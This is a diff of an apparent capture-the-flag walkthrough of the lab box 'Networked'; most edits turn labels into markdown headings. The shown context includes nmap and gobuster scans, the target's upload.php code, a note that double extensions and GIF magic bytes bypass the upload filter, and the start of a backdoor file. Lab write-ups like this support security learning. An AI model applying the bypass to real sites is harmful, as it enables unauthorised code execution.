@@ -12,7 +12,7 @@ This is a walkthrough of a box "Networkd".<br>
 # Solution
 ### 1. Initial Enumeration
 
-TCP Port Scanning:
+#### TCP Port Scanning:
 {% highlight shell %}
 root@kali:~# nmap -p- 10.10.10.146 -sV -sC
 Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-16 11:51 EET
@@ -34,7 +34,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 154.45 seconds
 {% endhighlight %}
 
-Gobuster HTTP port 80:
+#### Gobuster HTTP port 80:
 {% highlight shell %}
 root@kali:~# gobuster dir -u http://10.10.10.146/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .html,.php -s '200,204,301,302,403'
 ===============================================================
@@ -82,7 +82,7 @@ upload.php
 {% endhighlight %}
 
 Sounds "upload.php" is to upload a file. The function for that is defined in "lib.php"<br>
-upload.php:
+#### upload.php:
 {% highlight php %}
 <?php
 require '/var/www/html/lib.php';
@@ -137,7 +137,7 @@ if( isset($_POST['submit']) ) {
 ?>
 {% endhighlight %}
 
-lib.php:
+#### lib.php:
 {% highlight php %}
 <?php
 ---
@@ -200,7 +200,8 @@ In summerize, what "upload.php" is doing the followings.
 4. If these are OK, create a name of uploaded file with "getnameUploaded()"
 5. Finally, move the uploaded file from the temporary directory to "/uploads"
 
-This means, by using double extention method, with adding appropriate magic bytes, we can bypass the filter.
+This means, by using double extention method, with adding appropriate magic bytes, we can bypass the filter.<br>
+At first, create following file.
 {% highlight php %}
 root@kali:~# cat simple-backdoor.php.gif
 GIF89a
@@ -414,7 +415,7 @@ done
 [guly@networked ~]$ 
 {% endhighlight %}
 
-Execution of changename.sh:
+#### Execution of changename.sh:
 1. take user input as "$x"
 2. write each config "NAME", "PROXY_METHOD", "BROWSER_ONLY", "BOOTPROTO" in "ifconfig-guly"
 {% highlight shell %}
@@ -436,7 +437,7 @@ ERROR     : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem
 [guly@networked ~]$ 
 {% endhighlight %}
 
-Command output:
+#### Script output:
 {% highlight shell %}
 [guly@networked ~]$ cat /etc/sysconfig/network-scripts/ifcfg-guly
 cat /etc/sysconfig/network-scripts/ifcfg-guly
